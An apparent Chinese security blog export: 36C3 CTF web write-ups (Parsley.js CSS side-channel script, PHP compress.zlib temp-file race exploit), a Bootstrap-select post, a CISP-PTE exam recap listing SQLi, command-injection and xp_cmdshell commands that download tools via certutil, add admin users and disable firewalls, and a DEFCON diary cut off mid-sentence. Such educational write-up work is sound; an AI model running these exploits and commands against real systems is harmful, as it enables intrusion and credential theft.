action=\"/like.php\"&gt; &lt;input type=\"hidden\" name=\"c\" value=\"&lt;?= $_SESSION['c'] ?&gt;\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"&lt;?= $writeup['id'] ?&gt;\"&gt; &lt;input id=\"like\" type=\"submit\" value=\"👍\"&gt;&lt;/form&gt; 接着我们来看看 general.php 中的防御措施 123456789101112131415&lt;?phpsession_start(['cookie_httponly' =&gt; true, 'cookie_samesite' =&gt; 'Strict']);//...function id() { return bin2hex(random_bytes(8));}$nonce = base64_encode(id());//...header('x-xss-protection: 1; mode=block');header('X-Content-Type-Options: nosniff');header('x-frame-options: DENY');header('Referrer-Policy: no-referrer');header(\"Feature-Policy: geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'none'; magnetometer 'none'; gyroscope 'none'; speaker 'none'; fullscreen 'none'; payment 'none'; usb 'none'; vr 'none'; encrypted-media 'none'\");header(\"Content-Security-Policy: default-src 'none'; script-src 'nonce-\".$nonce.\"' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-sri-for script style;\"); 而script-src设置的 nonce 只在 header.php 使用了，而且我们也拿不到这个 nonce 123&lt;script nonce=\"&lt;?=$nonce?&gt;\"&gt; $('#publish-form').parsley() // prevent hacking&lt;/script&gt; 所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。 Parsley.js我们可以去 parsley.js doc 看到该 lib 的简单说明以及使用： Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users. Javascript form validation is not necessary, and if used, it does not replace strong backend server validation. That’s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices. 可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API： data-parsley-trigger=”input” Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=”focusin focusout”. Default is null. See the various events supported by jQuery. data-parsley-error-message=”my message” Customize a unique global message for the field. data-parsley-errors-container=”#element” Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source. 根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。 根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如： 1234567&lt;form data-parsley-validate&gt; &lt;input type=\"text\" data-parsley-trigger=\"blur\" autofocus name=\"some-field\" data-parsley-error-message=\"&lt;input id=like type=button value=padyload&gt;\" data-parsley-required data-parsley-errors-container=\"#div1\"/&gt;&lt;/form&gt; data-parsley-trigger指定了blur事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。 ###Click 回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过 selenium.webdriver调用find_element_by_xpath函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。 并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。 首先，因为find_element_by_xpath只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。 但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面 页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。 CSS Selector如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的data-parsley-errors-container API 有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。 类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用a[href^='/show.php?id={flag}]的形式来进行元素选择。 也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。 所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。 脚本编写也比较简单： 1234567891011121314151617181920212223242526272829303132333435import requestsimport times = requests.Session()base_url = \"http://ip:8001/\"res = s.get(base_url)pos = res.text.find('name=\"c\" value=\"') + len('name=\"c\" value=\"')csrftoken = res.text[pos:pos+16]ss = \"1234567890abcdef\"flag = \"\"for i in range(16): for j in ss: payload = f\"&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\\\"blur\\\" data-parsley-error-message='&lt;input type=\\\"input\\\" id=like value=\\\"rebirth_is_really_nb\\\"&gt;' data-parsley-errors-container=\\\"a[href^='/show.php?id={flag + j}']\\\" autofocus&gt;&lt;/form&gt;\" data = {'c': csrftoken, 'content': payload} res = s.post(base_url + \"add.php\", data=data, allow_redirects=False) # print(res.headers) location = res.headers['Location'] pos = location.find('id=') + 3 wp = location[pos:] data = {'c': csrftoken, 'id': wp} res = s.post(base_url + \"admin.php\", data=data) time.sleep(3) res = s.get(f\"http://ip:8001/show.php?id={wp}\") # print(res.text) txt = res.text.replace(\"\\n\", \"\").replace(\"\\r\", \"\") if \"Liked by&lt;/h3&gt;admin\" not in txt: flag += j print(i,flag) break 拿到 writeup id 之后直接访问即可： Other Selector当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如： 12345678&lt;form data-parsley-validate&gt; &lt;input type=\"text\"&gt; &lt;input type=\"text\" id=\"like\" data-parsley-trigger=\"blur\" autofocus name=\"some-field\" data-parsley-error-message=\"&lt;input id=like type=button&gt;\" data-parsley-required data-parsley-errors-container=\"a:contains('Writeup - 5'):eq(0)\" /&gt;&lt;/form&gt; 或者使用data-parsley-equalto API 进行判断属性值： data-parsley-equalto=”#anotherfield” Validates that the value is identical to another field’s value (useful for password confirmation check). 12345678910&lt;form data-parsley-validate&gt; &lt;input type=\"text\" data-parsley-trigger=\"focusout\" data-parsley-equalto='a[href^=\"/show.php?id=GUESS\"]' data-parsley-errors-container=\"form[action='/like.php']\" data-parsley-error-message='&lt;input type=\"input\" name=\"id\" value=\"0000000000000000\"&gt;' value='a[href^=\"/show.php?id=GUESS\"]' autofocus&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt; Includer Difficulty estimate: medium Solved:9/321 Points: round(1000 · min(1, 10 / (9 + [9 solves]))) = 556 points Description: Just sitting here and waiting for PHP 8.0 (lolphp). Download: includer-df39401c4c1c28ab.tar.xz (3.5 KiB) 题目给出源代码以及部署文件，源代码如下： 12345678910111213141516&lt;?phpdeclare(strict_types=1);$rand_dir = 'files/'.bin2hex(random_bytes(32));mkdir($rand_dir) || die('mkdir');putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir.\"\\n\";try { if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']); }}finally { system('rm -rf '.escapeshellarg($rand_dir));} Configuration Error其中配置文件有一个比较明显的配置错误： 1234location /.well-known { autoindex on; alias /var/www/html/well-known/;} 开启了列目录并且我们可以遍历到上层文件夹。 Upload Arbitrary Data一开始我看到这个没有&lt;?的形式，我想到的是p牛博客里面有关死亡 exit 的内容，谈一谈php://filter的妙用，奈何原文用的是file_put_content，我们这里用的是file_get_contents，并且这里的判断也在使用了file_get_contents函数之后进行判断是否有&lt;?，所以这里的编码绕过就不太可能了。 而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv()函数等，给了我们一个 sandbox ，然而我们似乎无法利用表面的代码进行文件上传啥的操作。 balsn 队伍在公开的 wp 中写了比较详细的源码分析，这里我就配合其中的 wp 进行一下简单的分析。 首先直接给出结论，我们可以使用compress.zip://流进行上传任意文件，接着我们来看看相关原理。 在 php-src 源代码中，我们可以找到该流的相关触发解析函数php_stream_gzopen ext/zlib/zlib_fopen_wrapper.c 1234567891011121314php_stream *php_stream_gzopen(php_stream_wrapper *wrapper, const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC){true...trueif (strncasecmp(\"compress.zlib://\", path, 16) == 0) {truetruepath += 16;true} else if (strncasecmp(\"zlib:\", path, 5) == 0) {truetruepath += 5;true}trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);true...truereturn NULL;} 我们可以看到有个标志位STREAM_WILL_CAST，我们可以先看看这个标志位用来干嘛，在main/php_streams.h定义了该标志位: 12345678/* If you are going to end up casting the stream into a FILE* or * a socket, pass this flag and the streams/wrappers will not use * buffering mechanisms while reading the headers, so that HTTP * wrapped streams will work consistently. * If you omit this flag, streams will use buffering and should end * up working more optimally. * */#define STREAM_WILL_CAST 0x00000020 很明显，这是一个用来将 stream 转换成 FILE* 的标志位，在这里就与我们创建临时文件有关了。 接着我们跟进php_stream_open_wrapper_ex函数，该函数在main/php_streams.h中被 define 为_php_stream_open_wrapper_ex。 1234567891011121314PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options,truetruezend_string **opened_path, php_stream_context *context STREAMS_DC){true//...trueif (stream != NULL &amp;&amp; (options &amp; STREAM_MUST_SEEK)) {truetruephp_stream *newstream;truetrueswitch(php_stream_make_seekable_rel(stream, &amp;newstream,truetruetruetruetrue(options &amp; STREAM_WILL_CAST)truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE)) //...truereturn stream;}/* }}} */ 该函数调用了php_stream_make_seekable_rel，并向其中传入了STREAM_WILL_CAST参数，我们跟进php_stream_make_seekable_rel函数，它在main/php_streams.h中被 define 为_php_stream_make_seekable，继续跟进 main/streams/cast.c 1234567891011121314151617181920212223/* {{{ php_stream_make_seekable */PHPAPI int _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, int flags STREAMS_DC){trueif (newstream == NULL) {truetruereturn PHP_STREAM_FAILED;true}true*newstream = NULL;trueif (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == 0) &amp;&amp; origstream-&gt;ops-&gt;seek != NULL) {truetrue*newstream = origstream;truetruereturn PHP_STREAM_UNCHANGED;true}true/* Use a tmpfile and copy the old streams contents into it */trueif (flags &amp; PHP_STREAM_PREFER_STDIO) {truetrue*newstream = php_stream_fopen_tmpfile();true} else {truetrue*newstream = php_stream_temp_new();true}true//...}/* }}} */ 我们可以看到如果flags与PHP_STREAM_PREFER_STDIO都被设置的话，而PHP_STREAM_PREFER_STDIO在 main/php_streams.h 中已经被 define 1#define PHP_STREAM_PREFER_STDIO 1 我们只需要关心 flags 的值就好了，我们只需要确定 flags 的值非零即可，根据前面的跟进我们易知 flags 的在这里非零，所以这里就调用了php_stream_fopen_tmpfile函数创建了临时文件。 于是我们可以做一个简单的验证，在本机上跑源代码，并用 pwntools 起一个服务用来发送一个大文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import requestsimport reimport threadingimport timedef send_chunk(l, data): l.send('''{}\\r{}\\r'''.format(hex(len(data))[2:], data))while(True): l = listen(9999) l.wait_for_connection() data1 = ''.ljust(1024 * 8, 'X') data2 = '&lt;?php system(\"/readflag\"); exit(); /*'.ljust(1024 * 8, 'b') data3 = 'c*/'.rjust(1024 * 8, 'c') l.recvuntil('\\r\\n\\r\\n') l.send('''HTTP/1.1 200 OK\\rContent-Type: exploit/revxakep\\rConnection: close\\rTransfer-Encoding: chunked\\r\\r''') send_chunk(l, data1) print('waiting...') print('sending php code...') send_chunk(l, data2) sleep(3) send_chunk(l, data3) l.send('''0\\r\\r\\r''') l.close() 这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。 Keep Temp File临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。 所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间： 使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。 使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用compress.zlib://ftp://形式，控制 FTP 速度即可 Bypass Waf接下来我们就要看如何来对关键地方进行绕过了。 123if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']);} 这个地方问了很多师傅，包括一血的 TokyoWesterns 的队员以及参考了主要的公开 WP，基本都是利用两个函数之间极端的时间窗进行绕过。 什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有 PHP 代码的文件数据，接着我们利用 HTTP 长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有 PHP 代码的数据了，这样就能使include_once包含我们的代码了。 因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。 Leak Dir path最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。 虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的 sandbox 路径。 所以我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码： 12345678910 data = '''file=compress.zlib://http://192.168.151.132:8080&amp;name='''.strip() + 'a' * (1024 * 7 + 882) r.send('''POST / HTTP/1.1\\rHost: localhost\\rConnection: close\\rContent-Length: {}\\rContent-Type: application/x-www-form-urlencoded\\rCookie: PHPSESSID=asdasdasd\\r\\r{}\\r'''.format(len(data), data)) Get Flag所以整个流程我们可以总结为以下： 利用 compress.zlib://http://orcompress.zlib://ftp:// 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件 利用超长的 name 溢出 output buffer 得到 sandbox 路径 利用 Nginx 配置错误，通过 .well-known../files/sandbox/来获取我们 tmp 文件的文件名 发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码 绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag 整个题目的关键点主要是以下几点(来自 @wupco)： 需要利用大文件或ftp速度限制让连接保持 传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径 tmp文件需要在两种文件直接疯狂切换，使得第一次file_get_contents获取的内容不带有&lt;?,include的时候是正常php代码，需要卡时间点，所以要多跑几次才行 .well-known../files/是nginx配置漏洞，就不多说了，用来列生成的tmp文件 由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag。 脚本放在gist-exp.py，其中 192.168.34.1 是本地题目地址，192.168.151.132 是 client 的地址。 References20191228-hxp36c3ctf https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0 https://ctftime.org/task/10211","link":"/2020/01/08/36c3-web/"},{"title":"Bootstrap-select碰到的一些问题","text":"项目中需要用到的是多选下拉框，由于项目用的是bootstrap，我便找到了bootstrap-select这个可以提供多选下拉框的库。 因为这个项目是用ajax获取数据然后把数据放入select中的，而原生的select multiple又实在是太僵硬123456&lt;select multiple&gt; &lt;option&gt;没错&lt;/option&gt; &lt;option&gt;就是&lt;/option&gt; &lt;option&gt;这么&lt;/option&gt; &lt;option&gt;僵硬&lt;/option&gt;&lt;/select&gt;查了一下w3c 12345678910定义和用法multiple 属性规定可同时选择多个选项。在不同操作系统中，选择多个选项的差异：对于 windows：按住 Ctrl 按钮来选择多个选项对于 Mac：按住 command 按钮来选择多个选项由于上述差异的存在，同时由于需要告知用户可以使用多项选择，对用户更友好的方式是使用复选框。提示：可以把 multiple 属性与 size 属性配合使用，来定义可见选项的数目 僵硬的不行。感觉自己写的话，一方面自己能力不足吧，另一方面是应该会有一大堆的库，自己写感觉\b太浪费时间，所以自己就去网上随便搜了一下，就发现了Bootstrap-select这个库，看起来\b很符合要求！那就决定是它啦！ 然后\b发现的一个问题是因为项目用到的\b数据是\b通过ajax来获取的，而且我们还用的是jquery拼接的形式，所以是\bhtml是&lt;select ...&gt;&lt;/select&gt;,js文件拼接是&lt;option&gt;...&lt;/option&gt;,但是就是这样出现了问题，并没有显示出我们想要的效果，\b没有显示出有\b数据的下拉框。当时感觉比较奇怪，感觉是框架的问题，又重新试了\b几次，发现只有在html文件里写option标签才能正常显示下拉框效果，就比较郁闷。 接着之后就又去找另一个库，然后发现了Amaze\b这个前端框架，有多选，又好看，只不过如果要改，\b改的成本会很大，页面基本都得改。\b当时觉得为了这个多选，一方面是\bBootstrap 3已经用烂了，不怎么好看，一方面也是为了多选，说换就换。然后基本把几个页面重构了。结果发现很累，而且出现了无法获取Amaze select选中的option的值，就比较烦，原本功能完好的页面被这么一折腾，\b基本功能都不好了。后来因为一些事有一段时间\b没理这个问题了。 好不容易\b有时间抽出空来，当时\b已经忘了之前\b做过什么了，就感觉Amaze这个解决不了，就又去找多选的下拉框架，这样又找回了Bootstrap-select这个库，然后用，至少能拯救基本功能，所以\b又放弃了重构到40%左右的Amaze框架，刚好那时候Bootstrap 4官方文档出来了，已经是正式版了，就换上了4，结果Bootstrap-select这个库\b官网的版本还没有\b支持Bootstrap 4，可是项目我又改了挺多的改成了4，这样改来改去不是问题啊。 于是我想起了之前某位\b高人跟我说解决问题的方法，\b如果遇到问题只是换框架，不去追究\b怎么解决，那始终是个sdk搬运工。 一方面感觉自己这样下去不是办法，\b另一方面是自己也并不想只做个\b搬运工，至少得是个高级\b搬运工吧:) 然后静下来，一个个问题去搜，基本也\b都有，比如\b因为Bootstrap 4正式版刚出来，select库还没有官网地上线支持，但是在他的github上已经有issue了，\b也提供了最新的支持版本。 \b接着，解决aja\bx的问题，个人当初觉得是因为数据发送在页面渲染之后，导致页面没有及时的把组件渲染出来，当时是搁置了一天左右，也懒得去找答案，后来随便一搜又搜到了该问题。附上原链接，然后又是多选框的\b选中\boption的值的获取问题，\b只要搜一搜就能\b找到了。 \b其实吧，这次碰到的问题都很简单，\b但是自己处理起来感觉\b极其xx，\b而且繁琐，最\b\b主要的是文档很重要，就比如Bootstrap-select文档明明就写有很多\bmethod 12345.selectpicker('render')You can force a re-render of the bootstrap-select ui with the render method. This is useful if you programatically change any underlying values that affect the layout of the element.$('.selectpicker').selectpicker('render'); 12345.selectpicker('refresh')To programmatically update a select with JavaScript, first manipulate the select, then use the refresh method to update the UI to match the new state. This is necessary when removing or adding options, or when disabling/enabling a select via JavaScript.$('.selectpicker').selectpicker('refresh'); 反而自己舍近求远，弄的相当复杂，同时如果有github，github的issue也是一个\b非常重要的\b解决方法的途径。 本文就想记述一下自己解决问题时候的方法，问题有很多，方法也可以有很多，也可以有很快的方法，希望通过这次能提高一下自己解决问题的能力，不再是一个sdk搬运工:)","link":"/2018/01/27/Bootstrap-select%E7%A2%B0%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"},{"title":"CISP-PTE考试分享","text":"前些阵子有个活动送了我 CISP 的考试券，今天去考了 CISP-PTE 认证，趁自己印象还比较深写一下 CISP-PTE介绍What is CISPCISP即“注册信息安全专业人员”，系国家对信息安全人员资质的最高认可。英文为 Certified Information Security Professional (简称CISP)，CISP系经中国信息安全产品测评认证中心（已改名中国信息安全测评中心）实施国家认证。CISP是强制培训的。如果想参加CISP考试，必须要求出具授权培训机构的培训合格证明。 再来看一下区别： ​ CISP 考证要求：需要工作经验 100到题目，单选，好像是60%就过线。 CISSP 考证要求：需要工作经验 考试时间6个小时，满分1000分，700分过线 CISP-PTE 考证要求：不需要工作经验 学生也可以考试，专项能力通过即可拿证 考试题型为客观题、实操题。客观题为单项选择题，共 20 题，每 题 1 分;实操题共 80 分。总分共 100 分，得到 70 分以上(含 70 分)为通过。 http://www.edufly.cn/cisp/7891.html 体系结构CISP-PTE 考试整体分为两个部分，一部分单项选择题，一部分实操题，考试时间4小时。 考试内容 考试形式 考试分数 安全加固与防御 单项选择 20 Web安全基础 实操 30 日志与数据分析 实操 20 渗透测试基础 实操 30 具体涉及知识可参考CISP-攻防领域考试中心 单选题比较基本的题目，一些概念题或者其他的题，例如 hacker 一词最早出自哪里等等 ###实操题 实操题都是通过在一个虚拟环境进行操作，虚拟环境里面提供了基本需要的工具，字典也会给，题目给的密文基本就是字典里面的，所以不必担心什么解不出来啥的问题 第一题–sql注入第一题一般是 sql 注入的题，比较简单，不需要手注，直接 sqlmap 跑也可以，不过我考试的时候就用手注，第一题万能密码，过滤了or以及注释符，用 12username: admin' || '1password: 1 即可登录拿到第一个 key 第二题—文件上传第二题一般是文件上传的题型，直接用 00 截断就可以了，不过我做的时候貌似还检查了文件内容，eval跟assert关键字都被过滤了，我直接用system直接读取的 key.php 第三题–文件包含这题当时我彻底陷入了 php 本地包含的洞里去了，加上平时我都是cp的 payload （不要问我为什么这么懒，这样快也比较方便…）导致自己考试的时候比较晕也怀疑自己的 payload 是不是写错了 1php://filter/read=convert.base64-encode/resource=key.php 但是一直做不出来…我也觉得不可能这么难吧 考完试我去问了一下出题的，他说是源代码里面有后门文件提示？？？ WTF？？？EXM？？？ 坑还是感觉有点坑的，不过还是觉得自己不细心导致没做出来的吧… 问了同学，view.html有后门提示，直接连上去就行了。。WTMD! 第四题–命令执行很简单的命令注入的一道题，用;或者其他命令分隔符绕过就行了，但是会屏蔽一些读取文件的命令，诸如cat、more等 最后忘了是通过用tail还是下面这个 payload 绕过了 1127.0.0.1;curl file:///var/www/html/key.php 第五题–日志审计我觉得很反人类的一道题，给你一个几MB的日志文件，然后让你肉眼审计发现后门…主要是那个虚拟环境不是很好，只有 Notepad++ ，我直接放了，看得眼睛都疼。 如果要做的话，直接跟 200 的 HTTP 状态码接着审计就差不多了… 第六题–综合渗透一个 windows + IIS + mssql 的环境，御剑拿到 www.zip ，然后拿到数据库密码，直接用数据库连接工具连上去，发现 key7，找到管理员密码，然后跑 md5 找到明文，登录后台拿到 key6。后面看其他师傅的一般套路是用 123456789101112131415161718192021222324252627EXEC sp_configure 'show advanced options',1; (记得reconfigure) reconfigureEXEC sp_configure 'xp_cmdshell',1;（记得reconfigure）启用xp_cmdshellreconfigureexec xp_cmdshell 'dir c:\\ /s /b |findstr \"key\"|findstr \"txt\"'; 找到key的位置exec xp_cmdshell 'type key位置\"'; 直接读key内容，不过一般不会让你有直接读的权限exec xp_cmdshell 'cacls c:\\ /s /b |findstr \"key\"|findstr \"txt\" /E /G adminstrator:F'; 改变文件操作权限，F是所有权限，改变权限后再读就能成功exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/3389.exe'; 这里的certutil的方式与基础题4中的curl思路相同，可参考。这里上传的是开启3389的工具。exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';创建账户exec master..xp_cmdshell 'net localgroup administrators test add'exec xp_cmdshell 'netsh firewall set opmode disable'; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/mimikazts.exe';如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。exec master..xp_cmdshell 'dir \"C:\\Documents and Settings\\Administrator\\桌面\\\" /A -D /B'exec xp_cmdshell 'type \"C:\\Documents and Settings\\Administrator\\桌面\\key.txt\"' 最后我通过xp_cmdshell执行命令没有发现 key8，问了一下人家说是要通过远程过去…做法是通过写一个一句话，上传一个类似 mimikatz 的工具，直接抓 Administrator 的密码，通过 reduh 进行 rdp 转发，再连远程，在桌面可以看到 key8 Conclusion个人感觉这是最失败的一次…因为第三题感觉真的是…有点坑，也怪自己不太小心。第四题因为真的看得眼睛难受不想看了。最后一个 key 确实需要一点技巧，自己在内网渗透这方面经验着实少，后来也学习了一些姿势。但是这环境真的是卡得一批，另一个跟我一起考的师傅也是很想吐槽这一点，然后我们双方达成了共识——为什么要考4小时，明明一小时多就可以解决的问题都是因为给机器拖沓的…哎，虽然感觉过不去，但是感觉自己也尽力了吧。也有些情有可原的地方，8点半的考试，我7点起，早起傻一天（手动狗头。 虽然有点感觉暴躁，原本可以轻轻松松过了的，结果可能没过，但是还是学到了一些姿势吧。无论结果如何，还是安慰自己学到了东西就好，反正考试券免费的hhhh Referencecisp-pte考试要点总结 CISP-PTE 注册渗透测试工程师考试 总结&amp;&amp;经验分享","link":"/2019/03/21/CISP-PTE%E8%80%83%E8%AF%95%E5%88%86%E4%BA%AB/"},{"title":"DEFCON 28 Final 杂记","text":"距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。 [TOC] Preface前言：本篇文章不代表任何组织社团的观点，全文仅代表个人看法以及意见。如有冒犯请联系我进行必要的修改。 由于今年疫情的原因，今年的 DEFCON Final 在线上举办，我有幸与 Tea Deliverers 一起参与了 DEFCON 28 CTF Final ，最终在比赛中取得了第四的成绩。本文我会主要从参赛经历见闻以及一些对于 Web 题的分析入手来写这篇文章，由于 Web 题过分简单，也没什么特别好分析的，所以没什么技术营养，可以权当小说看看，博君一笑。并且为了避免一些不必要的麻烦，全文涉及到姓名 ID 处我都尽量以某师傅进行称呼。 The First DEFCON Final In My LifeSimple Introduction今年的赛制我这里简单介绍一下，想详细了解的可以参考一下官网:https://oooverflow.io/dc-ctf-2020-finals/ 题目主要分为两种类型，一种类型是 AWD ，另一种是 KOH ，AWD 就比较常见了，就是攻防题目，这次也是我第一次接触 KOH 这种题目类型，这种题目类型往往是题目中有自己的一个积分规则，然后让各个队伍在每个 ROUND 尽可能拿到更多的分数，每个 ROUND 取前 N 名，每个 ROUND 结束统计分数并给前 N 名的队伍在总榜的 KOH 列加分。在 KOH 中如何拿更多的分数就是这个题目的出题点了，这些出题点可以有一些设置的漏洞或者什么其他的方式让你可以在一个 ROUND 厘面得更多的分数，简单来说，你可以理解 KOH 给了你一个游戏，每个队伍每5分钟玩一把游戏，你可以通过对游戏分析来找到一些 bug 或者什么其他的点，通过这个点来帮助你像“开挂”一样得分。 Time ​ We’ll start 5 AM Las Vegas time on Friday, August 7th (4 AM for setup). Here is the schedule (Nevada time == PDT): Shift 1: Friday 4am setup, 5am start, 1pm end First public recap: Friday 2 PM Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end Second public recap: Saturday 1 PM Shift 3: Saturday 2pm setup, 3pm start, 11pm end Shift 4: Sunday 7am setup, 8am start, 4pm end Third public recap: Sunday at noon (during the game) 这轮的时间可谓是相当的所谓的“健康”了，上述时间表翻译到北京时间过来就是： Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end Shift 2: Saturday 12am setup, 1pm start, 9pm end Shift 3: Sunday 5am setup, 6am start, 2pm end Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end 也就是说每个 Shift 比赛进行8小时，每个 Shift 中间间隔8小时，而且是正正好好的8小时 =.= 这就是所谓的“健康”赛制，但是我从比赛场地回家休息再搞会怎么都没剩多少时间了，我觉得还不如硬肝好了（反正我觉得没几个队像我这个混子一样8小时全睡），而且还分了4轮，这是真的肝，于是那几天我的世界就变成了一天16小时的世界，8小时看题当混子，8小时睡觉。（ Stealth Ports在 AWD 赛制中， OOO 加入了 Stealth Ports 这种机制： ​ New this year, each service will have a STEALTH port alongside it’s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ain’t cheap! If your team sends any traffic through a service’s stealth port to a given team, you will only receive half points for stealing that team’s flag that round. 也就是说主办方给大家开放了一个不给流量的端口，如果有攻击方成功通过这个端口获取到防守方的 Flag ，则 Flag 分会减半。也就是说这相当于一个隐形的端口，对于一血的队伍比较有利，可以通过这个端口迅速打全场而不被捕获到流量，但是得分会减半，也算是一种双刃剑。 Before Shift 1开始之前我也并没有什么特别的准备，经过一番讨论决定我们还是在某师傅的公司里打比赛，这些讨论包括但不限于比赛场地要不要选一个别墅啥的，但是考虑到网络问题还是决定了在公司里，以及大家要不要一起先吃个饭做个赛前动员什么的。所以就在开赛前2小时多，也就是下午5点多，我随我 Mentor 就一起去跟队员们吃了个饭，也算是跟大家认识认识，然后就被排在了 Leader 旁边坐（紧张死了，有种领导夹菜我转桌的冲动），然后 Leader 